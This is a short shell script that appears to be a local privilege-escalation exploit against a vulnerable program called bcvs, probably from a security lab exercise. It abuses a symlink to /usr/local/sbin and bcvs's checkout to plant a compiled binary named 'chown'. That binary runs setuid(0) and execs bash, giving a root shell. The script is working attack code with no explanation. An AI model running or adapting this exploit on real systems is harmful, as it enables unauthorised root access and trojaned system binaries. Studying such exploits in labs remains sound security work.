#!/bin/sh
echo here we go!
cd /opt/bcvs
mkdir dummydir
cd dummydir
mkdir .bcvs
cd .bcvs
touch block.list
cd ..
mkdir dummydir
ln -s /usr/local/sbin sbinlink
cd dummydir
mkdir sbinlink
cd sbinlink
cat <<EOF > chown.c
int main(int argc, char* argv[]) {
    setuid(0);
    seteuid(0);
    execlp("bash","bash", (char*)0);
}
EOF
gcc -o chown chown.c
cd ../..
../bcvs co ../dummydir/sbinlink/chown
cd ..
bcvs co bcvs.c
